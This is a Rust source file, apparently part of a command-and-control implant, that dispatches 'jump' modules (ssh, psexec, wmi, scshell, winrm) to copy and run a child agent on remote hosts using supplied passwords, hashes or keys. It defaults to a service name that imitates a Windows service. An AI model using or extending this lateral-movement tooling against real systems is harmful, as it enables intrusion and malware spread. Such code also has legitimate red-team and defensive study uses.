//! Jump modules — lateral movement to deploy P2P child agents.
//!
//! Each module implements a deployment mechanism (psexec, ssh, wmi, etc.)
//! that copies a P2P child agent binary to a remote target and executes it.

pub mod ssh;
#[cfg(windows)]
pub mod psexec;
#[cfg(windows)]
pub mod wmi;

use std::fmt;

#[derive(Debug)]
pub struct JumpError(pub String);

impl fmt::Display for JumpError {
    fn fmt(&self, f: &mut fmt::Formatter<'_>) -> fmt::Result {
        f.write_str(&self.0)
    }
}

pub struct JumpParams {
    pub module:           String,
    pub target:           String,
    pub user:             String,
    pub password:         String,
    pub hash:             String,
    pub key_path:         String,
    pub link_type:        String,
    pub bind_addr:        String,
    pub staging_path:     String,
    pub child_session_id: String,
    pub p2p_guid:         String,
    pub service:          String,
}

impl JumpParams {
    pub fn from_args(args: &serde_json::Value) -> Self {
        Self {
            module:           args.get("module").and_then(|v| v.as_str()).unwrap_or("").to_string(),
            target:           args.get("target").and_then(|v| v.as_str()).unwrap_or("").to_string(),
            user:             args.get("user").and_then(|v| v.as_str()).unwrap_or("").to_string(),
            password:         args.get("password").and_then(|v| v.as_str()).unwrap_or("").to_string(),
            hash:             args.get("hash").and_then(|v| v.as_str()).unwrap_or("").to_string(),
            key_path:         args.get("key_path").and_then(|v| v.as_str()).unwrap_or("").to_string(),
            link_type:        args.get("link_type").and_then(|v| v.as_str()).unwrap_or("tcp").to_string(),
            bind_addr:        args.get("bind_addr").and_then(|v| v.as_str()).unwrap_or("").to_string(),
            staging_path:     args.get("staging_path").and_then(|v| v.as_str()).unwrap_or("").to_string(),
            child_session_id: args.get("child_session_id").and_then(|v| v.as_str()).unwrap_or("").to_string(),
            p2p_guid:         args.get("p2p_guid").and_then(|v| v.as_str()).unwrap_or("").to_string(),
            service:          args.get("service").and_then(|v| v.as_str()).unwrap_or("XblAuthManager").to_string(),
        }
    }
}

pub enum JumpResult {
    Success { remote_path: String },
    Failed  { error: String },
}

pub fn dispatch(params: &JumpParams, payload: &[u8]) -> JumpResult {
    match params.module.as_str() {
        "ssh" => ssh::execute(params, payload),
        #[cfg(windows)]
        "psexec" => psexec::execute_svc(params, payload),
        #[cfg(windows)]
        "psexec_psh" => psexec::execute_psh(params, payload),
        #[cfg(windows)]
        "wmi" => wmi::execute(params, payload),
        #[cfg(windows)]
        "scshell" => wmi::execute_scshell(params, payload),
        #[cfg(windows)]
        "winrm" => wmi::execute_winrm(params, payload),
        _ => JumpResult::Failed {
            error: format!("unsupported jump module '{}' on this platform", params.module),
        },
    }
}
